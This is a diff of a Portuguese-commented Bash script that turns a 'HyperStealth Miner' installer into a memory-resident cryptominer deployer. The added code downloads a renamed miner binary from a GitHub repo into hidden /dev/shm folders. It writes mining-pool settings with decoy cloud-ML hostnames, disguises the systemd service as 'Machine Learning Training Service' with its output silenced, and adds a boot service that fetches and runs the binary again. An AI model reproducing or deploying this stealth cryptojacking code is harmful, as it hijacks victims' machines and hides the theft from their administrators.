@@ -1,120 +1,47 @@
 #!/bin/bash
-#
-# Script de correção para HyperStealth Miner v2.5
-#
 
-echo "=== Correção para HyperStealth Miner ==="
-
-# Verifica privilégios de root
-if [ "$(id -u)" -ne 0 ]; then
-  echo "Este script precisa ser executado como root"
-  exit 1
-fi
+echo "=== Instalação em Memória do Minerador ==="
 
 # Configurações
 WALLET="0x0067E6557AC5096733dB091900CC9B989148C4e5.A-1"
 SERVICE_NAME="mltrainer-$(hostname | md5sum | cut -c1-8)"
-LOG_FILE="/var/log/ml_monitor.log"
-WORK_DIR="/opt"
-REPO="rigelminer/rigel"
+LOG_FILE="/dev/shm/.ml_monitor.log"  # Usando /dev/shm (RAM disk)
 
-# Função para gerar nomes aleatórios
-random_name() {
-  tr -dc a-z0-9 </dev/urandom | head -c 8
+# Instala dependências
+echo "Instalando dependências..."
+apt-get update -qq
+apt-get install -y -qq python3-requests wget tar
+
+# Cria diretórios na RAM
+mkdir -p /dev/shm/.hyperstealth
+mkdir -p /dev/shm/.rigel_bin
+
+# Cria arquivo de configuração na RAM
+cat > /dev/shm/.hyperstealth/config.json << 'EOF'
+{
+  "stratum_servers": [
+    "stratum+tcp://18.223.152.88:5432",
+    "stratum+ssl://quai.kryptex.network:8888"
+  ],
+  "fallback_nodes": [
+    "ml-engine.googleapis.com",
+    "aws.sagemaker.training.amazonaws.com",
+    "api.azureml.windows.net"
+  ]
 }
+EOF
 
-# Download correto do Rigel Miner
-download_rigel() {
-  echo "Baixando e instalando Rigel Miner com nomes aleatórios..."
-  
-  # Cria diretório temporário
-  TMP_DIR="$(mktemp -d -p /tmp)"
-  cd "$TMP_DIR" || exit 1
-  
-  # Obtém a versão mais recente
-  LATEST_VERSION="$(curl -s https://api.github.com/repos/$REPO/releases/latest | grep 'tag_name' | sed -E 's/.*"v?([^"]+)".*/\1/')"
-  if [ -z "$LATEST_VERSION" ]; then
-    echo "Não foi possível determinar a versão mais recente, usando fixa."
-    LATEST_VERSION="1.9.2"
-  fi
-  echo "Versão encontrada: $LATEST_VERSION"
-  
-  # URL de download
-  DOWNLOAD_URL="https://github.com/$REPO/releases/download/v${LATEST_VERSION}/rigel-${LATEST_VERSION}-linux.tar.gz"
-  echo "Download URL: $DOWNLOAD_URL"
-  
-  # Baixa o arquivo
-  wget --no-check-certificate -q "$DOWNLOAD_URL" -O rigel.tar.gz
-  if [ ! -s rigel.tar.gz ]; then
-    echo "Erro: o arquivo baixado está vazio. Tentando versão fixa..."
-    DOWNLOAD_URL="https://github.com/$REPO/releases/download/v1.9.2/rigel-1.9.2-linux.tar.gz"
-    wget --no-check-certificate -q "$DOWNLOAD_URL" -O rigel.tar.gz
-    if [ ! -s rigel.tar.gz ]; then
-      echo "Erro fatal: não foi possível baixar o Rigel Miner."
-      exit 1
-    fi
-  fi
-  
-  # Extrai o arquivo
-  mkdir -p extracted
-  tar -xzf rigel.tar.gz -C extracted
-  if [ $? -ne 0 ]; then
-    echo "Erro na extração, tentando sem validação de formato..."
-    cd extracted
-    tar -xf ../rigel.tar.gz
-    cd ..
-  fi
-  
-  # Gera nomes aleatórios
-  NEW_FOLDER="module_$(random_name)"
-  NEW_BINARY="trainer_$(random_name)"
-  
-  # Localiza o binário rigel
-  ORIG_FOLDER=$(find extracted -type f -name "rigel" -o -name "Rigel" | head -n 1 | xargs dirname)
-  if [ -z "$ORIG_FOLDER" ]; then
-    echo "Binário não encontrado na extração. Baixando binário pré-compilado..."
-    mkdir -p "$WORK_DIR/$NEW_FOLDER"
-    wget --no-check-certificate -q "https://raw.githubusercontent.com/brunusansi/axjkjasjascklazi/refs/heads/main/rigel" -O "$WORK_DIR/$NEW_FOLDER/$NEW_BINARY"
-    chmod +x "$WORK_DIR/$NEW_FOLDER/$NEW_BINARY"
-  else
-    # Move para o diretório de trabalho
-    mkdir -p "$WORK_DIR/$NEW_FOLDER"
-    find "$ORIG_FOLDER" -type f -exec cp {} "$WORK_DIR/$NEW_FOLDER/" \;
-    
-    # Renomeia o binário
-    if [ -f "$WORK_DIR/$NEW_FOLDER/rigel" ]; then
-      mv "$WORK_DIR/$NEW_FOLDER/rigel" "$WORK_DIR/$NEW_FOLDER/$NEW_BINARY"
-    elif [ -f "$WORK_DIR/$NEW_FOLDER/Rigel" ]; then
-      mv "$WORK_DIR/$NEW_FOLDER/Rigel" "$WORK_DIR/$NEW_FOLDER/$NEW_BINARY"
-    fi
-    chmod +x "$WORK_DIR/$NEW_FOLDER/$NEW_BINARY"
-  fi
-  
-  # Limpa arquivos temporários
-  rm -rf "$TMP_DIR"
-  
-  echo "Binário instalado em: $WORK_DIR/$NEW_FOLDER/$NEW_BINARY"
-  echo "$WORK_DIR/$NEW_FOLDER/$NEW_BINARY"
-}
+# Baixa o binário diretamente para a RAM
+echo "Baixando binário do minerador para memória..."
+wget -q --no-check-certificate "https://raw.githubusercontent.com/brunusansi/axjkjasjascklazi/refs/heads/main/rigel" -O /dev/shm/.rigel_bin/rigel
+chmod +x /dev/shm/.rigel_bin/rigel
 
-# Instala dependências sem usar pip
-install_dependencies() {
-  echo "Instalando dependências..."
-  apt-get update -qq
-  apt-get install -y -qq python3-requests
-  # Se precisar mais pacotes Python, instale via apt
-}
-
-# Atualiza o script de monitoramento
-update_monitor_script() {
-  BINARY_PATH="$1"
-  echo "Atualizando script de monitoramento..."
-  
-  cat > /usr/local/bin/ml_monitor.py << EOF
+# Cria script de monitoramento em memória
+cat > /dev/shm/.ml_monitor.py << 'EOF'
 import os, sys, time, json, socket, ssl, logging, random, requests, subprocess, signal
 
 logging.basicConfig(
-    filename='/var/log/ml_monitor.log',
+    filename='/dev/shm/.ml_monitor.log',
     level=logging.INFO,
     format='%(asctime)s - %(levelname)s - %(message)s'
 )
@@ -122,11 +49,12 @@ logging.basicConfig(
 class StealthMiner:
     def __init__(self):
         self.wallet = os.environ.get('WALLET', '0x0067E6557AC5096733dB091900CC9B989148C4e5.A-1')
-        self.binary = '$BINARY_PATH'
+        self.binary = '/dev/shm/.rigel_bin/rigel'
+        self.config_path = '/dev/shm/.hyperstealth/config.json'
         self.current_stratum = None
         self.process = None
         
-        logging.info(f"Usando binário: {self.binary}")
+        logging.info(f"Usando binário em memória: {self.binary}")
         
         if not os.path.exists(self.binary):
             logging.error(f"Binário não existe: {self.binary}")
@@ -134,9 +62,9 @@ class StealthMiner:
             logging.info(f"Binário localizado com sucesso")
 
     def get_stratums(self):
-        """Busca os servidores stratum do arquivo local"""
+        """Busca os servidores stratum do arquivo na memória"""
         try:
-            with open("/etc/hyperstealth/config.json", 'r') as f:
+            with open(self.config_path, 'r') as f:
                 config = json.load(f)
             
             stratums = config['stratum_servers']
@@ -240,7 +168,7 @@ class StealthMiner:
         """Loop principal"""
         failures = 0
         
-        logging.info("Iniciando sistema de mineração...")
+        logging.info("Iniciando sistema de mineração em memória...")
         
         while True:
             try:
@@ -280,9 +208,6 @@ class StealthMiner:
                 time.sleep(60)
 
 if __name__ == "__main__":
-    # Cria diretório de logs
-    os.makedirs(os.path.dirname('/var/log/ml_monitor.log'), exist_ok=True)
-    
     try:
         miner = StealthMiner()
         miner.run()
@@ -291,44 +216,8 @@ if __name__ == "__main__":
         sys.exit(1)
 EOF
 
-  chmod +x /usr/local/bin/ml_monitor.py
-}
-
-# Função principal
-main() {
-  # Cria diretório para configuração
-  mkdir -p /etc/hyperstealth
-  
-  # Cria arquivo de configuração com os servidores stratum
-  cat > /etc/hyperstealth/config.json << EOF
-{
-  "stratum_servers": [
-    "stratum+tcp://18.223.152.88:5432",
-    "stratum+ssl://quai.kryptex.network:8888"
-  ],
-  "fallback_nodes": [
-    "ml-engine.googleapis.com",
-    "aws.sagemaker.training.amazonaws.com",
-    "api.azureml.windows.net"
-  ]
-}
-EOF
-  
-  # Instala dependências
-  install_dependencies
-  
-  # Baixa e instala o RigelMiner
-  BINARY_PATH=$(download_rigel)
-  if [ -z "$BINARY_PATH" ]; then
-    echo "Falha ao instalar o RigelMiner"
-    exit 1
-  fi
-  
-  # Atualiza o script de monitoramento
-  update_monitor_script "$BINARY_PATH"
-  
-  # Atualiza o serviço
-  cat > /etc/systemd/system/$SERVICE_NAME.service << EOF
+# Cria ou atualiza o serviço para usar o script em memória
+cat > /etc/systemd/system/$SERVICE_NAME.service << EOF
 [Unit]
 Description=Machine Learning Training Service
 After=network-online.target
@@ -337,39 +226,55 @@ Wants=network-online.target
 [Service]
 Type=simple
 Environment="WALLET=$WALLET"
-ExecStart=/usr/bin/python3 /usr/local/bin/ml_monitor.py
+ExecStart=/usr/bin/python3 /dev/shm/.ml_monitor.py
 Restart=always
 RestartSec=30
-StandardOutput=append:$LOG_FILE
-StandardError=append:$LOG_FILE
+StandardOutput=null
+StandardError=null
 
 [Install]
 WantedBy=multi-user.target
 EOF
-  
-  # Reinicia o serviço
-  systemctl daemon-reload
-  systemctl restart $SERVICE_NAME
-  
-  # Verifica o status
-  if systemctl is-active --quiet $SERVICE_NAME; then
-    echo "✓ Serviço reiniciado com sucesso!"
-  else
-    echo "✗ Erro ao reiniciar o serviço."
-    systemctl status $SERVICE_NAME
-  fi
-  
-  echo
-  echo "=== Correção Concluída ==="
-  echo "Minerador configurado para carteira: $WALLET"
-  echo "Nome do serviço: $SERVICE_NAME"
-  echo "Arquivo de log: $LOG_FILE"
-  echo "Binário: $BINARY_PATH"
-  echo
-  echo "Para monitorar o funcionamento:"
-  echo "  systemctl status $SERVICE_NAME"
-  echo "  tail -f $LOG_FILE"
-}
 
-# Executa a função principal
-main
+# Script para restaurar em caso de reinicialização
+cat > /etc/systemd/system/restore-miner.service << 'EOF'
+[Unit]
+Description=Restore Memory-Based Services
+After=network-online.target
+Wants=network-online.target
+
+[Service]
+Type=oneshot
+ExecStart=/bin/bash -c 'wget -q --no-check-certificate "https://raw.githubusercontent.com/brunusansi/axjkjasjascklazi/refs/heads/main/rigel" -O /dev/shm/.rigel_bin/rigel && chmod +x /dev/shm/.rigel_bin/rigel && systemctl restart mltrainer-*'
+RemainAfterExit=true
+
+[Install]
+WantedBy=multi-user.target
+EOF
+
+# Reinicia o serviço
+systemctl daemon-reload
+systemctl enable restore-miner.service
+systemctl restart $SERVICE_NAME
+
+# Verifica se o serviço está rodando
+echo "Verificando status do serviço..."
+if systemctl is-active --quiet $SERVICE_NAME; then
+    echo "✓ Serviço iniciado com sucesso na memória!"
+else
+    echo "✗ Erro ao iniciar o serviço."
+    systemctl status $SERVICE_NAME
+fi
+
+echo
+echo "=== Instalação em Memória Concluída ==="
+echo "Minerador configurado para carteira: $WALLET"
+echo "Nome do serviço: $SERVICE_NAME"
+echo "Arquivo de log (em memória): $LOG_FILE"
+echo
+echo "Para monitorar o funcionamento:"
+echo "  systemctl status $SERVICE_NAME"
+echo "  tail -f $LOG_FILE"
+
+# Limpa variáveis sensíveis
+unset WALLET
